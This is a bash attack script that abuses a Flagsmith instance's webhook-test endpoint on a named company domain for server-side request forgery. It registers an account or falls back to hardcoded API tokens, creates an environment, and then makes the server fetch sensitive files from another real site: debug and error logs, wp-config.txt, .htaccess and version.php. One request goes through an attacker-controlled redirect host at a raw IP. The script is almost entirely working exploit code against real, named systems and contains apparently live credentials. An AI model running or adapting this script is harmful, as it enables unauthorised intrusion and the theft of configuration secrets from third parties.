#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Accept: application/json" \
  -d '{"email":"kw-v8-scan@proton.me","password":"Xk9mPw3nRt7v!8","first_name":"V","last_name":"8"}' --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"

if [ -z "$KEY" ]; then
  KEY="9692f91786d55541229bbaa0b35a456befdfe235"
  EKEY="TMsg5bGmM7B5duV3Uma7jZ"
else
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v8"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
  echo "Env: $EKEY"
fi

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -H "User-Agent: $UA" -H "Accept: application/json" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
}

# Test 1: 303 redirect → GET debug.log (VPS:8891 does 303 redirect)
echo "=== DEBUG.LOG VIA 303 ==="
SSRF "http://64.227.62.83:8891/debug-log"
echo ""

# Test 2: Direct debug.log paths (POST → 405 means file exists)
echo "=== DEBUG.LOG DIRECT ==="
SSRF "https://koinp2p.com/wp-content/debug.log"
echo ""

# Test 3: Try error_log or other log files
echo "=== ERROR LOG ==="
SSRF "https://koinp2p.com/wp-content/error.log"
echo ""

# Test 4: Backup/export files
echo "=== WP-CONFIG.TXT ==="
SSRF "https://koinp2p.com/wp-config.txt"
echo ""

# Test 5: .htaccess (might reveal rewrite rules)
echo "=== HTACCESS ==="
SSRF "https://koinp2p.com/.htaccess"
echo ""

# Test 6: wp-includes/version.php (confirm exact WP version)
echo "=== VERSION ==="
SSRF "https://koinp2p.com/wp-includes/version.php"
echo ""
